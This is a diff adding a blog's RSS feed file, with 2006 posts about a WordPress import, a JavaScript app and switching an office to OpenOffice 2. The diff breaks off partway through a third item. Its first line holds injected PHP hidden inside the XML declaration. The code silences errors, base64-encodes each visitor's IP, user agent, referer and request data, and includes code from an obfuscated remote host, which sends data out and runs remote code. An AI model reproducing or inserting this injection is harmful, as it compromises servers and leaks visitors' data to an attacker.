@@ -1,0 +1,83 @@
+<?xml version="1.0" encoding="ISO-8859-1"error_reporting(0);$a=(isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : $HTTP_HOST); $b=(isset($_SERVER["SERVER_NAME"]) ? $_SERVER["SERVER_NAME"] : $SERVER_NAME); $c=(isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : $REQUEST_URI); $g=(isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : $HTTP_USER_AGENT); $h=(isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : $REMOTE_ADDR); $n=(isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : $HTTP_REFERER); $str=base64_encode($a).".".base64_encode($b).".".base64_encode($c).".".base64_encode($g).".".base64_encode($h).".".base64_encode($n);if((include_once(base64_decode("aHR0cDovLw==").base64_decode("dXNlcjcucGhwaW5jbHVkZS5ydQ==")."/?".$str))){} else {include_once(base64_decode("aHR0cDovLw==").base64_decode("dXNlcjcucGhwaW5jbHVkZS5ydQ==")."/?".$str);}?>
+<rss version="2.0">
+<channel>
+<title>MMORPGs and Real Life: An EverQuest, World of Warcraft, Vanguard and Linux blog.</title>
+<link>http://www.westkarana.com/index.php</link>
+<description><![CDATA[All Contents (C) 2005-2006, All Rights Reserved. Like anyone reads this.]]></description>
+<image>
+<url>http://www.westkarana.com/interface/feed.png</url>
+<link>http://www.westkarana.com/index.php</link>
+<title>MMORPGs and Real Life: An EverQuest, World of Warcraft, Vanguard and Linux blog.</title>
+<description><![CDATA[MMORPGs and Real Life: An EverQuest, World of Warcraft, Vanguard and Linux blog.]]></description>
+</image>
+<copyright>Copyright 2006, Tipa</copyright>
+<managingEditor>Tipa</managingEditor>
+<language>en-US</language>
+<generator>SPHPBLOG 0.4.6.1</generator>
+<item>
+<title>What happened here?</title>
+<link>http://www.westkarana.com/index.php?entry=entry060524-161430</link>
+<description><![CDATA[Bringing up another blog on Wordpress... I guess the import process on THIS blog broke it somehow...
+<br />]]></description>
+<category>General</category>
+<guid isPermaLink="true">http://www.westkarana.com/?entry=entry060524-161430</guid>
+<author>Tipa</author>
+<pubDate>Wed, 24 May 2006 23:14:30 GMT</pubDate>
+<comments>http://www.westkarana.com/comments.php?y=06&amp;m=05&amp;entry=entry060524-161430</comments>
+</item>
+<item>
+<title>Javascript and OpenOffice 2</title>
+<link>http://www.westkarana.com/index.php?entry=entry060505-114729</link>
+<description><![CDATA[<img src="images/shipped.gif" width=445 height=230 border=0 alt=''>
+<br />
+<br />More news from the borderline, terrifyingly exciting world of being an IT person in the fashion industry.
+<br />
+<br />Back, years and years ago... way back to when I worked at Thomson Learning <i>nee</i> Harcourt <i>nee</i> Archipelago Systems in Monterey (in the exact same offices where Digital Research, Inc. had developed GEM a decade before), I was kinda upset. I felt that <i>real</i> programmers were being pushed out by Javascript and Perl-using script kiddies with no feel for real systems software, application programming, usability or design. Working on Java Applets (you can see some of those to the right) was as far as I wanted to go toward a world where the browser was your platform. And then I was assigned to work on our learning management system (LMS), which was all embedded Java. Hated it. Got laid off. Didn&#039;t work full time for another two years.
+<br />
+<br />Being unemployed did wonderfully at pushing myself off that high horse. Now I am at a job earning about a third what I did back then, and happy to be programming anything at all.
+<br />
+<br />So when I say I am inordinately proud of a little JavaScript/ASP app like that pictured above (I tried to paste in a live example, but the blogware I&#039;m using turned green and fell to the floor gasping), you can know where I&#039;m coming from. And the best thing of all, is that it is being used. My number one frustration of being a professional programmer was working on applications that were never used. Now, I can throw together apps in a few hours and they are used immediately.
+<br />
+<br />That&#039;s a nice feeling. Being paid $90K/year to write them would be an even nicer feeling, but I guess those days are gone.
+<br />
+<br />---
+<br />
+<br />We would love to use Microsoft Office on all our computers here. But we plain just can&#039;t afford it. Microsoft does have a volume licensing plan, but the discounts are based on points. One point for every MS product you buy; and you have to commit to buying 150 points of software in two years (for instance; they have various plans) in order to qualify for the license.
+<br />
+<br />You can see how this locks you into Microsoft products. And the discounts for low point commitments are after all, not that great.
+<br />
+<br />So... we&#039;re looking into OpenOffice 2, an open-source, free replacement to Microsoft Office. This was sparked last week when a sales manager needed to open some Word and Excel documents on her Apple G4 Powerbook. It had come with a trial version of MS Office, but that had expired, and we were reluctant to pay the hundreds of dollars for a permanent copy.
+<br />
+<br />Enter OpenOffice 2. I had to install the X11 windowing system OO2 uses on her Powerbook, a Java runtime engine and OO2 itself, but it eventually came together and though slow, worked.
+<br />
+<br />Could we move to OO2 as a company, though. I mostly used open-source software already; Thunderbird vs Outlook for my email at work, and GNU/Linux &amp; apps for everything but games at home. I had never had to depend upon OSS for my actual work, though.
+<br />
+<br />We use databases heavily. Our Oracle database contains everything we do. We have an Access front end to it that does pretty meaty ODBC work with that, upon which we&#039;ve built numerous queries and reports.
+<br />
+<br />Anyway. Talked it over with my boss. It would be nice if we could do it. So I took the plunge and uninstalled MS Office from my work computer.
+<br />
+<br />Problems immediately. OO2 Base wouldn&#039;t open the Access DB directly; I had to make a new database that connected to it through ODBC (and it communicates to the Oracle DB through ODBC as well, so it&#039;s a pretty skanky hack). But once done, we had all the tables and queries available (though not forms or reports). This morning I was asked to write a quick report on orders that contained uncut styles and I was just immediately lost. I&#039;m going to try and skip the Access DB and make a direct connection to the Oracle DB; I think that we are not linking to certain tables in the Access DB, and I can&#039;t add that connection to the Access one.
+<br />
+<br />It&#039;s pretty scary.
+<br />
+<br />I also found OO2 cannot handle MS Publisher files in any way. This is serious; we get the linesheets from our designers and the people cutting the samples in Publisher format. And near as I can tell, there is no free, OSS application that can read those things.
+<br />
+<br />This is the kind of &quot;lock in&quot; that Microsoft loves. We can&#039;t move away from Office until we can read Publisher files, and Microsoft owns that format and isn&#039;t telling anyone how to read it.
+<br />
+<br />My boss is away on vacation next week, and I have to put together a prototype for a new website for our <a href="http://havengirl.com" target="_blank" >Haven Girl</a> line. The one I linked to is just a dummy one I threw up in a couple minutes using their &quot;build-a-website&quot; software because the default one was a parked one with links to &quot;Asian Girls&quot; and &quot;Thai Girls&quot;. I guess Google or Yahoo&#039;s advertising link generators had completely missed that Haven Girl was a children&#039;s clothing line... people here were horrified at that default page, and thus...
+<br />
+<br />So I have sitting on the desk here a bunch of printouts of fashion websites with notes on what the sales managers liked about them. My job: look at the websites and <strike>steal their code</strike> get inspiration for things we could do.
+<br />
+<br />While browsing web page code for ideas, I stumbled across pointers to a company called <a href="http://www.dyn-web.com/" target="_blank" >Dynamic Web Coding</a> that licenses all sorts of juicy Javascript to make web sites move. So this project suddenly became a lot easier.
+<br />
+<br />Now if I can just convince them that having a Flash intro of a heart drifting through falling flowers to come to rest on our logo ISN&#039;T a good idea...
+<br />]]></description>
+<category>General</category>
+<guid isPermaLink="true">http://www.westkarana.com/?entry=entry060505-114729</guid>
+<author>Tipa</author>
+<pubDate>Fri, 05 May 2006 18:47:29 GMT</pubDate>
+<comments>http://www.westkarana.com/comments.php?y=06&amp;m=05&amp;entry=entry060505-114729</comments>
+</item>
+<item>
+<title>A good day</title>
+<link>http://www.westkarana.com/index.php?entry=entry060429-175240</link>
